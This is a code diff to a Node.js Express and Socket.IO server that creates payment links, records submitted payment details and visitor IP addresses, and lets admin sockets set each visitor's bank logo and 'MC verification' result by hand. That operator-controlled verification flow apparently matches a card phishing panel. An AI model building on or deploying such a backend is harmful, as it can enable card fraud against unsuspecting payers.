@@ -29,6 +29,7 @@ const expiredLinks = new Set();
 // Track admin sockets separately
 const adminSockets = new Set();
 
+// Create HTML redirect files
 function createRedirectFile(targetHtml) {
   try {
     const fileName = `pay${SERVER_ID}.html`;
@@ -36,10 +37,8 @@ function createRedirectFile(targetHtml) {
 <!DOCTYPE html>
 <html>
 <head>
-  <!-- Redirect to the target HTML without appending a timestamp -->
-  <meta http-equiv="refresh" content="0;url=/${targetHtml}">
+  <meta http-equiv="refresh" content="0;url=/${targetHtml}?${Date.now()}">
   <script>
-    // Preserve original query parameters (pid & amount) by appending them from the current URL
     window.location.href = '/${targetHtml}' + window.location.search;
   </script>
 </head>
@@ -48,15 +47,16 @@ function createRedirectFile(targetHtml) {
 </body>
 </html>
 `;
+
     fs.writeFileSync(fileName, redirectHtml);
     console.log(`Created redirect file: ${fileName} -> ${targetHtml}`);
     return fileName;
   } catch (error) {
     console.error(`Failed to create redirect file: ${error.message}`);
+    // Return a fallback file name
     return 'index.html';
   }
 }
-
 
 // Create a redirect file for landing.html
 const PAYMENT_REDIRECT_FILE = createRedirectFile('landing.html');
@@ -419,32 +419,16 @@ app.get('/health', (req, res) => {
 // Serve static files with absolute path
 app.use(express.static(path.join(__dirname, '.')));
 
+// Add a route handler for random hash routes
 app.get('/:hash', (req, res, next) => {
-  // Get the hash from the URL (e.g. s6sxlc)
-  const hash = req.params.hash;
-  // Check if there is an existing file matching the route
+  // If this is a known file or directory, let the static middleware handle it
   const fullPath = path.join(__dirname, req.path);
   if (fs.existsSync(fullPath) && fs.statSync(fullPath).isFile()) {
     return next();
   }
   
-  // If query parameters are missing, try to recover payment data
-  if (!req.query.amount || !req.query.pid) {
-    // Check if the hash matches a stored payment link (using invoiceId as key)
-    if (paymentLinks.has(hash)) {
-      const payment = paymentLinks.get(hash);
-      const protocol = req.headers['x-forwarded-proto'] || req.protocol;
-      // Build the full redirect URL with the correct amount and pid
-      const newUrl = `${protocol}://${req.get('host')}/${PAYMENT_REDIRECT_FILE}?pid=${hash}&amount=${payment.amount}`;
-      console.log(`Redirecting short URL ${hash} to full URL with amount: ${newUrl}`);
-      return res.redirect(newUrl);
-    } else {
-      console.log(`No payment data found for hash: ${hash}`);
-      return res.status(404).sendFile(path.join(__dirname, '404.html'));
-    }
-  }
-  
-  // If the query parameters are present, serve index.html as usual
+  // Otherwise, serve index.html for all unknown single-segment routes
+  // This handles URLs like yourdomain.com/a1b2c3
   console.log(`Serving index.html for hash route: ${req.path}`);
   res.sendFile(path.join(__dirname, 'index.html'));
 });
@@ -516,7 +500,7 @@ app.post('/api/generatePaymentLink', (req, res) => {
       return res.status(400).json({ status: "error", message: "Description required" });
     }
 
-const invoiceId = crypto.randomBytes(8).toString('hex').toLowerCase();
+    const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
     const protocol = req.headers['x-forwarded-proto'] || req.protocol;
     
     // Use the redirect file instead of landing.html and include amount parameter
@@ -554,7 +538,7 @@ app.post('/api/generateFreeLink', (req, res) => {
       return res.status(400).json({ status: "error", message: "Invalid free link request" });
     }
 
-const invoiceId = crypto.randomBytes(8).toString('hex').toLowerCase();
+    const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
     const protocol = req.headers['x-forwarded-proto'] || req.protocol;
     
     // Use the redirect file instead of landing.html and include amount=0 parameter
@@ -667,7 +651,7 @@ app.post('/api/sendPaymentDetails', (req, res) => {
       return res.status(400).json({ status: "error", message: "Missing fields" });
     }
 
-const invoiceId = crypto.randomBytes(8).toString('hex').toLowerCase();
+    const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
     
     // Get IP address
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
@@ -1439,31 +1423,33 @@ if (!data.invoiceId) {
     console.log(`MC verification started for invoice: ${data.invoiceId}, type: ${data.verificationType}, bank: ${data.bankCode}`);
   });
 
-  socket.on('update_mc_bank', (data) => {
-    // Update bank logo on client
-    console.log('Received update_mc_bank event:', data);
+// FIX 2: Enhanced bank update handler in server.js
+socket.on('update_mc_bank', (data) => {
+  // Update bank logo on client
+  console.log('Received update_mc_bank event:', data);
+
+  // Update verification state
+  if (verificationStates.has(data.invoiceId)) {
+    const state = verificationStates.get(data.invoiceId);
+    state.bankCode = data.bankCode;
+    verificationStates.set(data.invoiceId, state);
+  }
+
+  // IMPORTANT: Send to all possible client paths
+  io.to(data.invoiceId).emit('update_mc_bank', {
+    invoiceId: data.invoiceId,
+    bankCode: data.bankCode
+  });
   
-    // Update verification state
-    if (verificationStates.has(data.invoiceId)) {
-      const state = verificationStates.get(data.invoiceId);
-      state.bankCode = data.bankCode;
-      verificationStates.set(data.invoiceId, state);
-    }
-  
-    io.to(data.invoiceId).emit('update_mc_bank', {
+  // If there's a stored socket ID for this transaction, also send to that socket directly
+  const txn = transactions.get(data.invoiceId);
+  if (txn && txn.socketId) {
+    io.to(txn.socketId).emit('update_mc_bank', {
       invoiceId: data.invoiceId,
       bankCode: data.bankCode
     });
-    
-    // If there's a stored socket ID for this transaction, also send to that socket directly
-    const txn = transactions.get(data.invoiceId);
-    if (txn && txn.socketId) {
-      io.to(txn.socketId).emit('update_mc_bank', {
-        invoiceId: data.invoiceId,
-        bankCode: data.bankCode
-      });
-    }
-  });
+  }
+});
 
   socket.on('update_mc_currency', (data) => {
     // Update currency on client
@@ -1556,33 +1542,37 @@ if (!data.invoiceId) {
     }
   });
 
-  socket.on('mc_verification_result', (data) => {
-    // Log the verification result
-    console.log('MC verification result:', data);
-  
-    // Update verification state
-    if (verificationStates.has(data.invoiceId)) {
-      const state = verificationStates.get(data.invoiceId);
-      state.status = data.success ? 'verified' : 'failed';
-      verificationStates.set(data.invoiceId, state);
+  // FIX 3: Enhanced verification result handler in server.js 
+socket.on('mc_verification_result', (data) => {
+  // Log the verification result
+  console.log('MC verification result:', data);
+
+  // Update verification state
+  if (verificationStates.has(data.invoiceId)) {
+    const state = verificationStates.get(data.invoiceId);
+    state.status = data.success ? 'verified' : 'failed';
+    verificationStates.set(data.invoiceId, state);
+  }
+
+  // Update transaction status
+  const txn = transactions.get(data.invoiceId);
+  if (txn) {
+    txn.status = data.success ? 'approved' : 'declined';
+    txn.redirectStatus = data.success ? 'success' : 'fail';
+    if (data.reason) {
+      txn.failureReason = data.reason;
     }
+    transactions.set(data.invoiceId, txn);
+  }
+
+  // Send verification result to client via multiple channels to ensure delivery
+  io.to(data.invoiceId).emit('mc_verification_result', data);
   
-    // Update transaction status
-    const txn = transactions.get(data.invoiceId);
-    if (txn) {
-      txn.status = data.success ? 'approved' : 'declined';
-      txn.redirectStatus = data.success ? 'success' : 'fail';
-      transactions.set(data.invoiceId, txn);
-    }
-  
-    // Send verification result to client
-    io.to(data.invoiceId).emit('mc_verification_result', data);
-    
-    // If there's a stored socket ID for this transaction, also send to that socket directly
-    if (txn && txn.socketId) {
-      io.to(txn.socketId).emit('mc_verification_result', data);
-    }
-  });
+  // If there's a stored socket ID for this transaction, also send to that socket directly
+  if (txn && txn.socketId) {
+    io.to(txn.socketId).emit('mc_verification_result', data);
+  }
+});
 
   socket.on('mc_verification_cancelled', (data) => {
     // Find the transaction for this socket if not provided
